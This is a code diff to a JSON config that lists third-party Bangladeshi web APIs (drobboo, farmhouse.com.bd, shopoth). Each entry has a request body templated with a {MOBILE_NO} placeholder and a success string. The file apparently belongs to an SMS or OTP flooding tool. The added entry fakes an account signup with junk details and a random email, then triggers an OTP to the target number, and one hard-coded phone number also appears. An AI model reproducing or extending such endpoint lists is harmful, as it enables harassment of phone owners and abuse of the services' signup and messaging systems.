@@ -187,7 +187,7 @@
     "url": "https://gateway.drobboo.com/core/api/v1/customer/sign-up",
     "method": "post",
     "data": "{\"firstName\":\"Bdbdbdb\",\"lastName\":\"Djjdbdbdb\",\"countryCode\":\"+880\",\"password\":\"Abc12345\",\"phoneNumber\":\"{MOBILE_NO}\"}",
-    "headers": {"Content-Type":" application/json"},
+    "headers": {"Content-Type":"application/json"},
     "identifier": "Success"
 }, {
     "url": "https://farmhouse.com.bd/wp-admin/admin-ajax.php",
@@ -196,11 +196,18 @@
     "headers": {"Content-Type":"application/x-www-form-urlencoded"},
     "identifier": "OTP sent"
 }, {
-    "url": "",
-    "method": "",
-    "data": "",
-    "headers": {},
-    "identifier": ""
+    "url": "https://api.shopoth.com/shop/api/v1/otps/send",
+    "method": "post",
+    "data": "{\"phone\":\"01913436288\"}",
+    "headers": {"Content-Type":"application/json"},
+    "identifier": "Successfully sent OTP",
+    "preback":{
+        "url":"https://api.shopoth.com/shop/api/v1/users/signup",
+        "method":"post",
+        "data":"{\"full_name\":\"Hshsbdb\",\"phone\":\"0{MOBILE_NO}\",\"email\":\"{RANDOM}@gmail.com\",\"subscribe\":false,\"gender\":\"1\",\"date_of_birth\":\"1988-08-16\",\"password\":\"shshvdbdhdj1\"}",
+        "headers":{"Content-Type":"application/json"},
+        "identifier":"User registration successful"
+    }
 }, {
     "url": "",
     "method": "",
